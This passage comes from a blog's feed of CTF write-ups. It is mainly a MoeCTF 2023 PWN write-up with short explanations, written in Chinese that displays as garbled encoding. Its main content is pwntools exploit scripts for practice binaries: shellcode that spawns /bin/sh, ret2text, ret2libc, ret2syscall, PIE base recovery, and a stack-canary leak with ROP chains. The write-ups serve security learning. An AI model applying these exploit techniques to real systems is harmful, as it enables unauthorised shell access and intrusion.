<p><strong>exp å¦‚ä¸‹ï¼š</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># p = process(&#x27;./111&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span>, <span class="number">28131</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># payload = b&#x27;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05&#x27;</span></span><br><span class="line"> </span><br><span class="line">payload = asm(shellcraft.sh())</span><br><span class="line"> </span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h1><span id="æ€»ç»“">æ€»ç»“ï¼š</span></h1><p>è¿™æ¬¡æ¯”èµ›æ€»ä½“ä¸é”™ï¼ŒRE å’Œ CRYPTO éƒ½åšäº†äº›ï¼Œå¯æƒœçš„å°±æ˜¯ PWN æ²¡æœ‰ akï¼Œæš´éœ²å‡ºäº†è‡ªå·±çš„å¼±ç‚¹ï¼Œè¿˜æ˜¯è¦æ…¢æ…¢æ²‰æ·€ï¼Œå¯¹æ±‡ç¼–è¿˜çœŸçš„ä¸æ˜¯å¾ˆç†Ÿï¼ŒåŠ æ²¹å§ï¼Œå†²å†²å†²ï¼ï¼ï¼</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>PWN</tag>
        <tag>SWPU NSS</tag>
      </tags>
  </entry>
  <entry>
    <title>MoeCTF 2023 PWN</title>
    <url>/MoeCTF%202023%20PWN/</url>
    <content><![CDATA[<p>MoeCTF 2023 PWN</p>
<span id="more"></span>

<h1><span id="ç®€ä»‹">ç®€ä»‹ï¼š</span></h1><p>MoeCTF æ˜¯è¥¿å®‰ç”µå­ç§‘æŠ€å¤§å­¦ä¸€å¹´ä¸€åº¦çš„ä¿¡æ¯å®‰å…¨æ–°ç”Ÿå¤ºæ——èµ›, ç”±è¥¿ç”µä¿¡æ¯å®‰å…¨åä¼š (XDSEC) é¢å‘å…¨ä½“å‡†å¤§å­¦ç”Ÿä¸¾åŠã€‚å®Œç»“æ’’èŠ±ï¼ï¼ï¼</p>
<p>PWNæ–¹å‘çš„é¢˜ç›®è¿˜æ˜¯å¾ˆä¸é”™çš„ï¼Œæ¶µç›–äº†å¾ˆå¤šçš„çŸ¥è¯†ç‚¹ï¼Œç”±æµ…å…¥æ·±å¾ªåºæ¸è¿›ï¼Œè‡ªå·±ä¹Ÿæ”¶è·ä¸å°‘ï¼ŒåŠ æŠŠæ²¹ï¼ï¼ï¼æ˜å¹´å†æ¥ï¼ï¼ï¼</p>
<hr>
<h2><span id="test_nc">test_nc</span></h2><p>ç­¾åˆ°é¢˜ï¼Œè€ƒå¯Ÿç‚¹å°±æ˜¯ nc è¿æ¥ï¼ŒLinux å‘½ä»¤æŸ¥çœ‹éšè—æ–‡ä»¶ï¼ˆ<code>ls -a</code>ï¼‰</p>
<p><img src="/images/MoeCTF2023PWN/1.png"></p>
<hr>
<h2><span id="baby_calculator">baby_calculator</span></h2><p>åˆ©ç”¨å¥½ pwntools æ¥å†™è„šæœ¬ï¼Œä¸»è¦å‘å°±æ˜¯åº”è¯¥æ€ä¹ˆæ¥å—æ‰åˆé€‚ï¼Œè¿˜æœ‰å°±æ˜¯åœ¨å†™ python è„šæœ¬çš„æ—¶å€™é—´è·æ˜¯å¾ˆé‡è¦çš„ï¼ˆä¸åŒé—´è·è¿è¡Œé¡ºåºä¸ä¸€æ ·ï¼‰ï¼Œä¸‹é¢è¿™ä¸ªç‚¹å¸Œæœ›æ³¨æ„ä¸‹ï¼š</p>
<p><img src="/images/MoeCTF2023PWN/2.png"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line"> </span><br><span class="line">p = remote(<span class="string">&#x27;localhost&#x27;</span>,<span class="number">42051</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">	p.recvuntil(<span class="string">&quot;The second:&quot;</span>)</span><br><span class="line">	p.recvline()</span><br><span class="line">	num1 =p.recvuntil(<span class="string">&quot;+&quot;</span>)[:-<span class="number">1</span>]</span><br><span class="line">	num2 =p.recvuntil(<span class="string">&quot;=&quot;</span>)[:-<span class="number">1</span>]</span><br><span class="line">	num =p.recvline()</span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">int</span>(num) ==<span class="built_in">int</span>(num1) +<span class="built_in">int</span>(num2):</span><br><span class="line">		p.sendline(<span class="string">&quot;BlackBird&quot;</span>)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		p.sendline(<span class="string">&quot;WingS&quot;</span>)</span><br><span class="line"> </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="fd">fd</span></h2><p>fd æ–‡ä»¶æè¿°ç¬¦ï¼Œæ–‡ä»¶æè¿°ç¬¦æ˜¯ä¸€ä¸ªéè´Ÿæ•´æ•°ï¼Œæœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªç´¢å¼•å€¼ï¼Œ0ä»£è¡¨æ ‡å‡†è¾“å…¥ï¼Œ1ä»£è¡¨æ ‡å‡†è¾“å‡ºï¼Œ2ä»£è¡¨æ ‡å‡†é”™è¯¯ï¼Œæ¥ä¸‹æ¥å°±æ˜¯å»çŒœ fd å¯èƒ½ä¼šç­‰äºå¤šå°‘ï¼ˆä» 3 å¼€å§‹ï¼‰ï¼Œç„¶åè¿›è¡Œ <code>(fd * 4) | 0x29A</code> æŒ‰ä½æˆ–è¿ç®—</p>
<p><img src="/images/MoeCTF2023PWN/3.png"></p>
<p>å½“ fd &#x3D; 3 æ—¶ï¼Œ<code>new_fd = 12 | 0x29a = 670</code>ï¼ˆè¿›åˆ¶è½¬æ¢å’ŒæŒ‰ä½è¿ç®—ä½ åº”è¯¥ä¼šå§ï¼‰ï¼Œç»“æœçœŸæ˜¯å½“ fd &#x3D;3 çš„æ—¶å€™ï¼Œå®åœ¨çŒœä¸åˆ°çš„è¯ï¼Œå°±å»çˆ†ç ´</p>
<p><img src="/images/MoeCTF2023PWN/4.png"></p>
<hr>
<h2><span id="int_overflow">int_overflow</span></h2><p>è€ƒå¯Ÿä¸€ä¸ªæ•´å‹æº¢å‡ºï¼Œé¢˜ç›®è®©ä½ è¾“å…¥ä¸€ä¸ªä¸æ˜¯è´Ÿæ•°çš„æ•°ç­‰äº -114514ï¼Œå› ä¸º int ç±»å‹çš„èŒƒå›´æ˜¯ï¼š-2147483648 ~ 2147483647</p>
<p>æ•´å‹æº¢å‡ºçš„æ„æ€å·®ä¸å¤šå°±æ˜¯è¾“å…¥ 2147483648 å°±ä¼šå˜æˆ 0ï¼Œè¿™æ ·ç®—å°±æ˜¯å¾—åˆ°ä¸‹é¢è¿™ä¸ªæ•°ï¼ˆè¿™ä¸ªå°±æ˜¯åŸç†ï¼Œå…¶å®ä¸ç”¨è¿™ä¹ˆéº»çƒ¦ï¼Œå¯ä»¥ç›´æ¥åœ¨ ida é‡Œé¢æ‰¾åˆ°ï¼‰</p>
<p><img src="/images/MoeCTF2023PWN/5.png"></p>
<p><img src="/images/MoeCTF2023PWN/6.png"></p>
<hr>
<h2><span id="ret2text_32">ret2text_32</span></h2><p>ç»å…¸ 32 ä½æ ˆæº¢å‡ºï¼Œbinsh å’Œ system éƒ½ç»™äº†ï¼Œç›´æ¥å¹²ï¼š</p>
<p><img src="/images/MoeCTF2023PWN/7.png"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(pwnfile)</span></span><br><span class="line">io = remote(<span class="string">&#x27;localhost&#x27;</span>,<span class="number">33587</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvline(<span class="string">&quot;What&#x27;s your age?\n&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;100&#x27;</span>)    </span><br><span class="line"></span><br><span class="line">bin_addr = <span class="number">0x804C02C</span></span><br><span class="line">sys_addr = <span class="number">0x80492A9</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x58</span> +<span class="number">4</span>) + p32(sys_addr) + p32(<span class="number">0</span>) + p32(bin_addr)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="ret2text_64">ret2text_64</span></h2><p>ç»å…¸ 64 ä½æ ˆæº¢å‡ºï¼Œå°±æ˜¯å’Œ 32 ä½ä¼ å‚ä¸ä¸€æ ·ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;localhost&#x27;</span>,<span class="number">36355</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./111&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sys_addr = <span class="number">0x4012B7</span></span><br><span class="line">bin_sh = <span class="number">0x404050</span></span><br><span class="line">rdi_addr = <span class="number">0x4011be</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;What&#x27;s your age?\n&quot;</span>,<span class="string">b&#x27;200&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x50</span> +<span class="number">8</span>) + p64(rdi_addr) + p64(bin_sh) + p64(sys_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="shellcode_level0">shellcode_level0</span></h2><p>ç»å…¸é¢˜å‹ï¼Œå”¯ä¸€éœ€è¦æ³¨æ„çš„å°±æ˜¯64ä½shellcodeéœ€è¦æ ‡ä½ç¯å¢ƒ context.arch &#x3D; &quot;amd64&quot; ï¼Œæ²¡æœ‰çš„è¯å°±é»˜è®¤32ä½</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;localhost&#x27;</span>,<span class="number">42989</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./111&#x27;)</span></span><br><span class="line">elf =ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#payload = b&#x27;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05&#x27;</span></span><br><span class="line">payload = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="shellcode_level1">shellcode_level1</span></h2><p>å‡ºç°äº†é€‰æ‹©ï¼Œä¸€ä¸ªä¸€ä¸ªè¯•å°±å®Œäº‹äº†ï¼š</p>
<p><img src="/images/MoeCTF2023PWN/8.png"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;localhost&#x27;</span>,<span class="number">41529</span><span class="string">&#x27;)</span></span><br><span class="line"><span class="string">elf =ELF(&#x27;</span>./<span class="number">111</span><span class="string">&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#payload = b&#x27;</span>\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">p.sendline(b&#x27;</span><span class="number">4</span><span class="string">&#x27;)</span></span><br><span class="line"><span class="string">payload = asm(shellcraft.sh())</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">p.sendline(payload)</span></span><br><span class="line"><span class="string">p.interactive()</span></span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="uninitialized_key">uninitialized_key</span></h2><p>è¿™é¢˜å”¯ä¸€çš„ç‚¹å°±æ˜¯éœ€è¦çŸ¥é“nameå’Œkeyé‡Œé¢çš„å‚æ•°æ˜¯åŒä¸€ä¸ªï¼Œç„¶åä¹Ÿå¾ˆå®¹æ˜“å‘ç°åªéœ€è¦è®©key &#x3D;114514å°±å¯ä»¥ç›´æ¥è·å–flagï¼Œè¿™é‡Œåªèƒ½å¾€ageé‡Œé¢è¾“å…¥114514ï¼Œç„¶åkeyé‡Œé¢è¾“å…¥ &#39;\x00&#39;ï¼Œä¸èƒ½å€’è¿‡æ¥ï¼ˆå€’è¿‡æ¥å°±ä¼šè¢« &#39;\x00&#39;æˆªæ–­ï¼Œæ— æ³•è¾“å…¥114514ï¼‰</p>
<p><img src="/images/MoeCTF2023PWN/9.png"></p>
<p><img src="/images/MoeCTF2023PWN/10.png"></p>
<p>expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;localhost&#x27;</span>,<span class="number">45429</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./111&#x27;)</span></span><br><span class="line">elf =ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;114514&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="pie_enabled">PIE_enabled</span></h2><p>å¼€å¯ PIEï¼Œå¹¶ä¸” ida ç»™äº† vuln çš„åœ°å€ï¼Œå¯ä»¥å¾—åˆ°åŸºå€ï¼š</p>
<p><img src="/images/MoeCTF2023PWN/11.png"></p>
<p><img src="/images/MoeCTF2023PWN/12.png"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;localhost&#x27;</span>,<span class="number">38497</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./111&#x27;)</span></span><br><span class="line">elf =ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#sys_addr =elf.sym[&#x27;system&#x27;]</span></span><br><span class="line"><span class="comment">#bin_sh =0x4010</span></span><br><span class="line"><span class="comment">#rdi_addr =0x1323</span></span><br><span class="line"><span class="comment">#ret_addr =0x101a</span></span><br><span class="line">vuln_add = <span class="number">0x1245</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">vuln_addr = <span class="built_in">int</span>(p.recvline(),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">base = vuln_addr - vuln_add</span><br><span class="line">sys_addr = elf.sym[<span class="string">&#x27;system&#x27;</span>] + base</span><br><span class="line">bin_sh = <span class="number">0x4010</span> + base</span><br><span class="line">rdi_addr = <span class="number">0x1323</span> + base</span><br><span class="line">ret_addr = <span class="number">0x101a</span> + base</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x50</span> +<span class="number">8</span>) + p64(ret_addr) + p64(rdi_addr) + p64(bin_sh) + p64(sys_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="ret2libc">ret2libc</span></h2><p>ç»å…¸ ret2libcï¼Œexpå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;localhost&#x27;</span>,<span class="number">42973</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc6_2.35-0ubuntu3_amd64.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">got_addr = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">plt_addr = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr = <span class="number">0x4011E8</span></span><br><span class="line">rdi_addr = <span class="number">0x40117e</span></span><br><span class="line">ret_addr = <span class="number">0x40101a</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x50</span> +<span class="number">8</span>) + p64(rdi_addr) + p64(got_addr) + p64(plt_addr) + p64(main_addr)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;But..maybe libc can help u??\n\n&#x27;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[:<span class="number">6</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">sys_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = libc_base +  <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x50</span> +<span class="number">8</span>) + p64(ret_addr) + p64(rdi_addr) + p64(bin_sh) + p64(sys_addr)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;But..maybe libc can help u??\n\n&#x27;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="ret2syscall">ret2syscall</span></h2><p>åŒæ ·æ˜¯ç»å…¸é¢˜å‹ï¼Œåç»­æˆ‘ä¼šåœ¨æŠ€å·§ï¼ˆ2ï¼‰ä¸­æŠŠå¥—è·¯æ€»ç»“å‡ºæ¥ï¼Œexpè·Ÿç€å¥—è·¯æ¥å°±è¡Œï¼Œç›¸å…³çš„åœ°å€éƒ½å¯ä»¥åœ¨idaé‡Œé¢æ‰¾åˆ°ï¼Œå®åœ¨ä¸è¡Œå°±ç”¨ROPgadgetå»æ‰¾</p>
<p><img src="/images/MoeCTF2023PWN/13.png"></p>
<p><img src="/images/MoeCTF2023PWN/14.png"></p>
<p>expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;localhost&#x27;</span>,<span class="number">45009</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./111&quot;</span>)</span><br><span class="line"></span><br><span class="line">syscall = <span class="number">0x4011AE</span></span><br><span class="line">bin_sh = <span class="number">0x404040</span></span><br><span class="line">pop_rax = <span class="number">0x40117e</span></span><br><span class="line">pop_rdi = <span class="number">0x4012e3</span></span><br><span class="line">pop_rsi_rdx = <span class="number">0x401182</span></span><br><span class="line">bss = <span class="number">0x404060</span><span class="comment">#readelf -S ./æ–‡ä»¶å | grep bssæŸ¥çœ‹å¯è¯»å¯å†™çš„bssæ®µ</span></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x10</span> +<span class="number">8</span>)</span><br><span class="line">payload += p64(pop_rdi) + p64(bin_sh) </span><br><span class="line">payload += p64(pop_rsi_rdx) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) </span><br><span class="line">payload += p64(pop_rax) + p64(<span class="number">59</span>) </span><br><span class="line">payload += p64(syscall) </span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="shellcode_level2">shellcode_level2</span></h2><p>idaä¸€ä¸‹å‘ç°åæ±‡ç¼–ä¸äº†ï¼Œæ‰€ä»¥åªèƒ½è§‚å¯Ÿæ±‡ç¼–ä»£ç ï¼Œä½ å°±ä¼šå‘ç°ä¸€äº›ä¸åŒï¼ˆéœ€è¦æŒæ¡testçš„ç”¨æ³•ï¼‰</p>
<p>Testå‘½ä»¤å°†ä¸¤ä¸ªæ“ä½œæ•°è¿›è¡Œé€»è¾‘ä¸è¿ç®—ï¼Œå¹¶æ ¹æ®è¿ç®—ç»“æœè®¾ç½®ç›¸å…³çš„æ ‡å¿—ä½ã€‚ä½†æ˜¯ï¼ŒTestå‘½ä»¤çš„ä¸¤ä¸ªæ“ä½œæ•°ä¸ä¼šè¢«æ”¹å˜ã€‚è¿ç®—ç»“æœåœ¨è®¾ç½®è¿‡ç›¸å…³æ ‡è®°ä½åä¼šè¢«ä¸¢å¼ƒã€‚</p>
<p>ç®€å•ç‚¹æ¥è¯´ï¼Œå°±æ˜¯å¦‚æœ <strong>al<code> &lt;= 0</code></strong>ï¼Œå°±è·³åˆ°é‚£ä¸ª<code>åœ°å€</code>ï¼Œå¦åˆ™ç»§ç»­å¾€ä¸‹æ‰§è¡Œï¼Œæ‰€ä»¥ä¸‹é¢æˆ‘ä»¬éœ€è¦è®©ç¨‹åºè·³è½¬åˆ°é‚£ä¸ªåœ°å€ï¼Œæ‰€ä»¥è®©å®ƒ al &#x3D; 0</p>
<p><img src="/images/MoeCTF2023PWN/15.png"></p>
<p>expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;localhost&#x27;</span>,<span class="number">43561</span>)</span><br><span class="line">elf =ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span> + asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="uninitialized_key_plus">uninitialized_key_plus</span></h2><p>è¿™é“é¢˜å‡ºçš„ä¹Ÿéå¸¸æœ‰æ„æ€ï¼Œæ„Ÿè§‰å¯ä»¥è®©åˆå­¦è€…æ›´å¥½çš„ç†è§£ç¨‹åºä¸­çš„ä¸€ç‚¹å°ç»†èŠ‚ä¸åŒè€Œå¯¼è‡´çš„expå†™æ³•çš„ä¸åŒï¼Œå¦‚ä¸‹å›¾ï¼Œè¿™é“é¢˜æ‰€è¾“å‡ºçš„ç±»å‹æ˜¯%så­—ç¬¦ä¸²ï¼Œè·Ÿä¸Šä¸€ç±»å‹%dæ•´å‹çš„é¢˜ä¸ä¸€æ ·ï¼Œæ³¨æ„åˆ°äº†è¿™ä¸€ç‚¹å°±å·®ä¸å¤šæ²¡æœ‰é—®é¢˜äº†</p>
<p><img src="/images/MoeCTF2023PWN/16.png"></p>
<p><img src="/images/MoeCTF2023PWN/17.png"></p>
<p>expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;localhost&#x27;</span>,<span class="number">37955</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">20</span> + p64(<span class="number">0x1BF52</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="little_canary">little_canary</span></h2><p>ç»å…¸ canary æ³„éœ²æ–¹å¼ï¼ˆæ²¡æœ‰æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼‰ï¼š</p>
<p><img src="/images/MoeCTF2023PWN/18.png"></p>
<p>expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;localhost&#x27;</span>,<span class="number">37537</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span> + <span class="string">b&#x27;b&#x27;</span></span><br><span class="line">p.sendafter(<span class="string">b&#x27;What\&#x27;s your name?\n&#x27;</span>, payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">canary = u64(<span class="string">b&quot;\x00&quot;</span> + p.recv(<span class="number">7</span>))</span><br><span class="line"></span><br><span class="line">vuln = <span class="number">0x40121B</span></span><br><span class="line">plt_addr = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">got_addr = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">rdi_addr = <span class="number">0x401343</span></span><br><span class="line">ret_addr = <span class="number">0x40101a</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span> + p64(canary) + p64(<span class="number">0</span>) + p64(rdi_addr) + p64(got_addr) + p64(plt_addr) + p64(vuln)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;I put a canary on my stack!\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">b&#x27;What\&#x27;s your name?&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span> + p64(canary) + p64(<span class="number">0</span>) + p64(ret_addr) + p64(rdi_addr) + p64(bin_sh) + p64(sys_addr)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;I put a canary on my stack!\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h1><span id="æ€»ç»“">æ€»ç»“ï¼š</span></h1><p>è¿™æ¬¡æ¯”èµ›æ”¶è·å¾ˆå¤šï¼Œåˆè®©æˆ‘å¯¹ PWN çš„ç†è§£ä¸Šå‡äº†ä¸€ä¸ªé«˜åº¦ï¼ŒåŒæ—¶ä¹Ÿå‘ç°äº†è‡ªå·±çš„è–„å¼±çš„åœ°æ–¹ï¼Œç»§ç»­åŠ æ²¹ï¼Œå†²å†²å†²ï¼ï¼ï¼</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>PWN</tag>
        <tag>MoeCTF</tag>
      </tags>
  </entry>
